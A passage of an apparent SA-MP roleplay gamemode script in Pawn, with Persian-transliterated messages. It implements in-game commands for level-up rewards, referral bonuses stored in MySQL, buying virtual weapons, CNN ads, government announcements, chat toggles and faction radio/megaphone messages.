                SaveKonFloat(playerid, "cLocationx", CarSpawn[rand][0]);
                PlayerInfo[playerid][cLocationy] = CarSpawn[rand][1];
                SaveKonFloat(playerid, "cLocationy", CarSpawn[rand][1]);
                PlayerInfo[playerid][cLocationz] = CarSpawn[rand][2];
                SaveKonFloat(playerid, "cLocationz", CarSpawn[rand][2]);
                PlayerInfo[playerid][cAngle] = 89.143226;
                SaveKonFloat(playerid, "cAngle", 89.143226);


	        PlayerInfo[playerid][cModel] = 481;
                SaveKonVal(playerid, "cModel", 481);
		SendClientMessage(playerid, COLOR_YELLOW, "Be Monasebate Level 5 Server Be To Yek BMX dad.");
		SendClientMessage(playerid, COLOR_YELLOW, "Be Checkpoint darj Shode rooye map boro va tahvil begir");
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                PlayerInfo[playerid][cFixed] = 1;
                SaveKonVal(playerid, "cFixed", 1);
                PlayerInfo[playerid][cFuel] = 100;
                SaveKonVal(playerid, "cFuel", 100);
                PlayerInfo[playerid][cHealth] = 1000.0;
                SaveKonFloat(playerid, "cHealth", 1000);
		new Float:x,Float:y,Float:z;
		new car = PlayerInfo[playerid][pCar];
		GetVehiclePos(car, x, y, z);
		OnCheckpoint[playerid] = 1;
		SetPlayerCheckpoint(playerid, x, y, z, 6);
		locatemashin[playerid] = 1;
                SetVehicleParamsEx(PlayerInfo[playerid][pCar], 0, 0, 0, 1, 0, 0, 0);
	    }
            GameTextForPlayer(playerid,string3,4000,1);
            if(PINFO[playerid][pReferral] != 0)
            {
                new query[256];
                format(query, 256, "SELECT * FROM `users` WHERE pIp='%s' AND pID='%i' AND pName<>'%s'", PINFO[playerid][pIp], PINFO[playerid][pReferral], PINFO[playerid][pName]);
                new Cache:result = mysql_query(handle, query);
                if(cache_num_rows() > 0)
                {
                    new ajabzstr[256];
                    new fuckername[MAX_PLAYER_NAME];
                    cache_get_row(0, 0, fuckername, handle, MAX_PLAYER_NAME);
                    format(ajabzstr, 256, "Warning: Player %s(%i) is on transfering illegal with %s by referral.", PINFO[playerid][pName], playerid, fuckername);
                    AdminWarn(ajabzstr);
                }
                cache_delete(result);
                new prz = random(1)+1;
                if(prz == 1)
                {
                    new rpp = random((PINFO[playerid][pLevel]*2))+1;
                    new bool:IsOnl;
                    for(new i;i<LastPID;i++)
                    {
                        if(IsPlayerConnected(i))
                        {
                            if(PINFO[i][pID] == PINFO[playerid][pReferral])
                            {
                                PINFO[i][pExp] += rpp;
                                SaveKonVal(i, "pExp", PINFO[i][pExp]);
                                IsOnl = true;
                            }
                        }
                    }
                    if(IsOnl == false)
                    {
                        new query2[256];
                        format(query2, 256, "UPDATE `users` SET pExp=pExp+'%i' WHERE pID='%i'", rpp, PINFO[playerid][pReferral]);
                        mysql_tquery(handle, query2, "SendQuery", "");
                    }
                }
                else if(prz == 2)
                {
                    new rpp = PINFO[playerid][pLevel]*1000;
                    new bool:IsOnl;
                    for(new i;i<LastPID;i++)
                    {
                        if(IsPlayerConnected(i))
                        {
                            if(PINFO[i][pID] == PINFO[playerid][pReferral])
                            {
                                PINFO[i][pAccount] += rpp;
                                SaveKonVal(i, "pAccount", PINFO[i][pAccount]);
                                IsOnl = true;
                            }
                        }
                    }
                    if(IsOnl == false)
                    {
                        new query2[256];
                        format(query2, 256, "UPDATE `users` SET pAccount=pAccount+'%i' WHERE pID='%i'", rpp, PINFO[playerid][pReferral]);
                        mysql_tquery(handle, query2, "SendQuery", "");
                    }
                }
            }
            if(PlayerInfo[playerid][pPremiumAccount] > 0)
            {
                PlayerInfo[playerid][pExp] -= expamount;
                new total = PlayerInfo[playerid][pExp];
                if(total > 0)
                {
                    PlayerInfo[playerid][pExp] = total;
                }
                else
                {
                    PlayerInfo[playerid][pExp] = 0;
                }
            }
            else
            {
                PlayerInfo[playerid][pExp] = 0;
            }
            SaveKonVal(playerid, "pExp", PINFO[playerid][pExp]);
        }
        return 1;
    }
    if (strcmp(cmd, "/buygun", true) == 0)
    {
        if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "You haven't weapon license.");
        if(TooBiz[playerid] != 0 && TooBiz[playerid] != 1 && TooBiz[playerid] != 54) return SCM(playerid, COL_SYN, "You are not in store.");
        new GunName[180];
        GunName = strtok(cmdtext, idx);
        if(!strlen(GunName))
        {
            SCM(playerid, COL_SYN, "Syntax: /buygun <WeaponName> <Ammo>");
            SCM(playerid, COLOR_CRS4, "Available weapon names: SDPistol($10) Deagle($20) Shotgun($50)");
            SCM(playerid, COLOR_CRS4, "Available weapon names: AK-47($45) M4($45) Rifle($50) MP5($40)");
            SCM(playerid, COLOR_CRS4, "Ammo price per 99 ammo: SDPistol($12) Deagle($30) Shotgun($60)");
            return SCM(playerid, COLOR_CRS4, "Ammo price per 99 ammo: AK-47($50) M4($50) Rifle($70) MP5($50)");
        }
        tmp = strtok(cmdtext, idx);
        if(!strlen(GunName))
        {
            SCM(playerid, COL_SYN, "Syntax: /buygun <WeaponName> <Ammo>");
            SCM(playerid, COLOR_CRS4, "Available weapon names: SDPistol($10) Deagle($20) Shotgun($50)");
            SCM(playerid, COLOR_CRS4, "Available weapon names: AK-47($45) M4($45) Rifle($50) MP5($40)");
            SCM(playerid, COLOR_CRS4, "Ammo price per 99 ammo: SDPistol($12) Deagle($30) Shotgun($60)");
            return SCM(playerid, COLOR_CRS4, "Ammo price per 99 ammo: AK-47($50) M4($50) Rifle($70) MP5($50)");
        }
        new ammoamount = strval(tmp), GunID, TofangPool;
        if(!strcmp(GunName, "SDPistol", true))
        {
            GunID = 23, TofangPool = floatround(ammoamount*12.0/99.0, floatround_ceil);
        }
        else if(!strcmp(GunName, "Deagle", true))
        {
            GunID = 24, TofangPool = floatround(ammoamount*30.0/99.0, floatround_ceil);
        }
        else if(!strcmp(GunName, "Shotgun", true))
        {
            GunID = 25, TofangPool = floatround(ammoamount*60.0/99.0, floatround_ceil);
        }
        else if(!strcmp(GunName, "AK-47", true))
        {
            GunID = 30, TofangPool = floatround(ammoamount*50.0/99.0, floatround_ceil);
        }
        else if(!strcmp(GunName, "M4", true))
        {
            GunID = 31, TofangPool = floatround(ammoamount*50.0/99.0, floatround_ceil);
        }
        else if(!strcmp(GunName, "Rifle", true))
        {
            GunID = 33, TofangPool = floatround(ammoamount*70.0/99.0, floatround_ceil);
        }
        else if(!strcmp(GunName, "MP5", true))
        {
            GunID = 29, TofangPool = floatround(ammoamount*50.0/99.0, floatround_ceil);
        }
        else return SCM(playerid, COL_SYN, "Type a correct weapon name.");
        if(ammoamount > 1000 || ammoamount < 5) return SCM(playerid, COLOR_ALI, "Please give me a correct ammo between 5 and 1000.");
        GivePlayerTofang(playerid, GunID, ammoamount);
        GivePlayerPool(playerid, -TofangPool);
        format(string, 256, "You buy a %s for $%s with %i ammo.", GunName, FormatNumber(TofangPool), ammoamount);
        return SCM(playerid, COLOR_CRS4, string);
    }
//----------------------------------[advertise]-----------------------------------------------
    if(strcmp(cmd, "/ad", true) == 0 || strcmp(cmd, "/advertisement", true) == 0)
    {
            if(IsAtCnn(playerid))
            {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "** You havent logged in yet !");
                return 1;
            }
            if(PlayerInfo[playerid][pLevel] < 7)
            {
                SendClientMessage(playerid, COLOR_RED, "You have to be level 7 to use this command.");
                return 1;
            }
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[256];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/ad)vertisement [advert text]");
                return 1;
            }
            if(adtimer >= 900)
            {
             SCM(playerid,COL_SYN,"The cnn ads box is full yet, Please try again later.");
             return 1;
            }
            if(adtimerplayer[playerid] > 0)
            {
            format(string,256,"You already voted for an ad, Please wait %i sec or less so we can show your ad.",adtimerplayer[playerid]);
            SCM(playerid,COL_SYN,string);
            return 1;
            }
            strmid(adtextplayer[playerid], (result), 0, strlen((result)), 512);
            new payout = strlen(adtextplayer[playerid]) * SBizzInfo[7][sbEntranceCost];
            new lengad = strlen(adtextplayer[playerid]);
            if(GetPlayerPool(playerid) < payout)
            {
                format(string, sizeof(string), "You used %d characters which cost $%s, You haven't enough.", lengad, FormatNumber(payout));
                SendClientMessage(playerid, COLOR_WHITE, string);
                return 1;
            }
            GivePlayerPool(playerid, - payout);
            SBizzInfo[7][sbTill] += payout;
            format(string, sizeof(string), "~r~Paid $%d~n~~w~Message contained: %d Characters", payout, lengad);
            GameTextForPlayer(playerid, string, 5000, 1);
            adtimer += 30;
            adtimerplayer[playerid] = adtimer;
            format(string,256,"Your ad will be show after %i sec or less.",adtimer);
            SCM(playerid,COLOR_ALI,string);
            }
            else
            {
            SCM(playerid,COLOR_ALI,"You are not at a CNN agency.");
            return 1;
            }
        return 1;
    }
//----------------------------------[government]-----------------------------------------------
    if(strcmp(cmd, "/government", true) == 0 || strcmp(cmd, "/gov", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pLeader] == 7 || PlayerInfo[playerid][pLeader] == 20)
            {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/gov)ernment [text]");
                return 1;
            }
            new RankMan[256];
            if(PlayerInfo[playerid][pLeader] == 1) { RankMan = "Police Department Leader"; }
            if(PlayerInfo[playerid][pLeader] == 2) { RankMan = "FBI Leader"; }
            if(PlayerInfo[playerid][pLeader] == 3) { RankMan = "National Guard Leader"; }
            if(PlayerInfo[playerid][pLeader] == 7) { RankMan = "{BBF060}Mayor"; }
            if(PlayerInfo[playerid][pLeader] == 20) { RankMan = "{60F565}SF Police Departament"; }
            SendClientMessageToAll(COLOR_WHITE, "|___________ Government News Announcement ___________|");
            format(string, sizeof(string), "%s %s{FFFFFF}: %s",RankMan, sendername, result);
            SendClientMessageToAll(COLOR_DBLUE, string);
            } else { SCM(playerid,COLOR_ALI,"You are not a Cop/Mayor Leader."); return 1; }
        }
        return 1;
    }

//----------------------------------[togs]-----------------------------------------------
    if(strcmp(cmd, "/togooc", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if (PlayerInfo[playerid][pPremiumAccount] == 1)
         {
            if (!gOoc[playerid])
            {
                gOoc[playerid] = 1;
                SendClientMessage(playerid, COLOR_GRAD2, "OOC chat channel Disabled !");
            }
            else if (gOoc[playerid])
            {
                gOoc[playerid] = 0;
                SendClientMessage(playerid, COLOR_GRAD2, "OOC chat channel Enabled !");
            }
        }
          else
          {
           SCM(playerid, COLOR_RED, "You haven't premium account, buy it From our /forum");
           return 1;
          }
         }
        return 1;
    }
    if(!strcmp(cmd,"/togevent",true))
    {
        if(PINFO[playerid][pPremiumAccount] == 0) return SCM(playerid,COLOR_RED,"You haven't a premium account, you can buy one from our /forum.");
        if(TogEvent[playerid] == false)
        {
            TogEvent[playerid] = true;
            SCM(playerid,COLOR_ALI,"Event Chat Channel has been closed for You.");
        }
        else
        {
            TogEvent[playerid] = false;
            SCM(playerid,COLOR_ALI,"Event Chat Channel has been opened for You.");
        }
        return 1;
    }
    if(strcmp(cmd, "/tognews", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pPremiumAccount] == 1)
            {
                if (!gNews[playerid])
                {
                    gNews[playerid] = 1;
                    SCM(playerid, COLOR_GRAD2, "News chat channel Disabled.");
                }
                else if (gNews[playerid])
                {
                    gNews[playerid] = 0;
                    SCM(playerid, COLOR_GRAD2, " News chat channel Enabled.");
                }
            }
            else
            {
            SCM(playerid, COLOR_RED, "You haven't premium account, buy it From our /forum");
            return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/togfam", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pPremiumAccount] == 1)
            {
                if (!gFam[playerid])
                {
                    gFam[playerid] = 1;
                    SCM(playerid, COLOR_GRAD2, "Family chat channel Disabled.");
                }
                else if (gFam[playerid])
                {
                    gFam[playerid] = 0;
                    SCM(playerid, COLOR_GRAD2, "Family chat channel Enabled.");
                }
            }
            else
            SCM(playerid, COLOR_RED, "You haven't premium account, buy it From our /forum");
        }
        return 1;
    }
    if(strcmp(cmd, "/togwhisper", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pPremiumAccount] == 1)
            {
                if (!HidePM[playerid])
                {
                    HidePM[playerid] = 1;
                    SendClientMessage(playerid, COLOR_GRAD2, "Whisper chat channel Disabled.");
                }
                else if (HidePM[playerid])
                {
                    HidePM[playerid] = 0;
                    SendClientMessage(playerid, COLOR_GRAD2, "Whisper chat channel Enabled.");
                }
        }

            else
            {
            SCM(playerid, COLOR_RED, "You haven't premium account, buy it From our /forum");
            return 1;
            }
            }
        return 1;
    }
    if(strcmp(cmd,"/turn",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            new x_nr[256];
            x_nr = strtok(cmdtext, idx);
            if(!strlen(x_nr))
            {
                SCM(playerid, COLOR_WHITE, "USAGE: /turn [on or off]");
                return 1;
            }
            if(strcmp(x_nr,"off",true) == 0)
            {
                if (PhoneOnline[playerid] == 1)
                {
                    if(Mobile[playerid] != 9999 || CallWaiting[playerid] != 9999)
                    {
                        OnPlayerCommandText(playerid, "/h");
                    }
                    PhoneOnline[playerid] = 0;
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    format(string, sizeof(string), "%s turns off the phone.", sendername);
                    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                }
                else
                SCM(playerid, COLOR_YELLOW,"Your phone is already turned off.");
                return 1;
            }
            if(strcmp(x_nr,"on",true) == 0)
            {
                if (PhoneOnline[playerid] == 0)
                {
                    PhoneOnline[playerid] = 1;
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    format(string, sizeof(string), "%s turns on the phone.", sendername);
                    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                }
                else
                SCM(playerid, COLOR_YELLOW,"Your phone is already turned on.");
                return 1;
            }
        }
        return 1;
    }
//----------------------------------[Emote]-----------------------------------------------
    /*if(strcmp(cmd, "/me", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "   You havent logged in yet !");
                return 1;
            }
            if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /me [action]");
                return 1;
            }
                format(string, sizeof(string), "* %s %s.", sendername, result);

            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
        }
        return 1;
    }*/
//============================[local]===================================================
    if(strcmp(cmd, "/b", true) == 0)//local ooc
    {
        if(IsPlayerConnected(playerid))
        {
            if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "You havent logged in yet !");
                return 1;
            }
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
   new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /b [local ooc chat]");
                return 1;
            }
            new strchat[180];
            format(strchat, sizeof(strchat), "%s Goft: (( %s ))", sendername, result);
            ProxDetector(20.0, playerid, strchat,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
            //printf("%s", string);
        }
        return 1;
    }
    if(strcmp(cmd, "/low", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "You havent logged in yet !");
                return 1;
            }
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
            if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new result[256];
            result = strtokEx(cmdtext,idx);
            new strchat[180];
            format(strchat, sizeof(strchat), "%s Goft: [LOW] %s", sendername, result);
            ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1);
            ProxDetector(3.0, playerid, strchat,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
        }
        return 1;
    }
//----------------------------------[Shout]-----------------------------------------------
    if(strcmp(cmd, "/shout", true) == 0 || strcmp(cmd, "/s", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "You havent logged in yet.");
                return 1;
            }
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
            if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
            GetPlayerName(playerid, sendername, sizeof(sendername));
   new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
   new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/s)hout [local chat]");
                return 1;
            }
            new strchat[180];
            format(strchat, sizeof(strchat), "%s Goft: %s!", sendername, result);
            ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1);
            ProxDetector(30.0, playerid, strchat,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2);
            //printf("%s", string);
        }
        return 1;
    }
//----------------------------------[Shout]-----------------------------------------------
    if(strcmp(cmd, "/megaphone", true) == 0 || strcmp(cmd, "/m", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
   new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/m)egaphone [megaphone chat]");
                return 1;
            }
            if(gTeam[playerid] == TEAM_COP)
            {
            if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not on-duty.");
                return 1;
            }
                    if(PlayerInfo[playerid][pMember] == 1||PlayerInfo[playerid][pLeader] == 1)
                    {
                        new currank[64];
                        if(PlayerInfo[playerid][pRank] == 1) { currank = "Soldier"; }
                        else if(PlayerInfo[playerid][pRank] == 2) { currank = "Police Officer"; }
                        else if(PlayerInfo[playerid][pRank] == 3) { currank = "Sergeant"; }
                        else if(PlayerInfo[playerid][pRank] == 4) { currank = "Captain"; }
                        else if(PlayerInfo[playerid][pRank] == 5) { currank = "Colonel"; }
                        else if(PlayerInfo[playerid][pRank] == 6) { currank = "Chief"; }
                        else if(PlayerInfo[playerid][pRank] == 7) { currank = "PD Leader"; }
                        format(string, sizeof(string), "[%s %s:o< %s >]", currank, sendername, result);
                        ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
                    }
                    else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
                    {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "[FBI Leader %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "[Director %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "[Deputy Director %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "[Unit Chief %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "[Supervisory Special Agent %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "[Special Agent %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "[New Agent Trainee %s:o< %s >]", sendername, result); }
                ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
                    }
                    else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
                    {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "[National Guard Leader %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "[Marshal %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "[Sergeant Major %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "[Master Sergeant %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "[Sergeant %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "[Corporal %s:o< %s >]", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "[Private %s:o< %s >]", sendername, result); }
                ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
                    }
                    else if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
                    {
						new currank[64];
                        if(PlayerInfo[playerid][pRank] == 1) { currank = "Soldier"; }
                        else if(PlayerInfo[playerid][pRank] == 2) { currank = "Police Officer"; }
                        else if(PlayerInfo[playerid][pRank] == 3) { currank = "Sergeant"; }
                        else if(PlayerInfo[playerid][pRank] == 4) { currank = "Captain"; }
                        else if(PlayerInfo[playerid][pRank] == 5) { currank = "Colonel"; }
                        else if(PlayerInfo[playerid][pRank] == 6) { currank = "Chief"; }
                        else if(PlayerInfo[playerid][pRank] == 7) { currank = "SFPD Leader"; }
                        format(string, sizeof(string), "[%s %s:o< %s >]", currank, sendername, result);
                ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
                    }
                    //printf("%s", string);
                    strmid(Megaphonetext[playerid], result, 0, strlen(result), 255);
            }
            else
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not a Cop");
                return 1;
            }
        }
        return 1;
    }






//----------------------------------[Team]-----------------------------------------------
    if(strcmp(cmd, "/radio", true) == 0 || strcmp(cmd, "/r", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
   new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/r)adio [radio chat]");
                return 1;
            }
            if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** PD Leader %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Chief %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Colonel %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Captain %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Sergeant %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Police Officer %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** Soldier %s(radio): %s, over. **", sendername, result); }
                SendRadioMessage(1, COLOR_BLUE, string);
                //printf("%s", string);
                return 1;
            }
            else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** FBI Leader %s(radio): %s **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Director %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Deputy Director %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Unit Chief %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Supervisory Special Agent %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Special Agent %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** New Agent Trainee %s(radio): %s, over. **", sendername, result); }
                SendRadioMessage(2, COLOR_BLUE, string);
                //printf("%s", string);
                return 1;
            }
            else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** National Guard Leader %s(radio): %s, over **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Marshal %s: %s(radio), over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Sergeant Major %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Master Sergeant %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Sergeant %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Corporal %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** Private %s(radio): %s, over. **", sendername, result); }
                SendRadioMessage(3, COLOR_BLUE, string);
                //printf("%s", string);
                return 1;
            }
            else if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** SFPD Leader %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Chief %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Colonel %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Captain %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Sergeant %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Police Officer %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** Soldier %s(radio): %s, over. **", sendername, result); }
                SendRadioMessage(20, COLOR_BLUE, string);
                //printf("%s", string);
                return 1;
            }
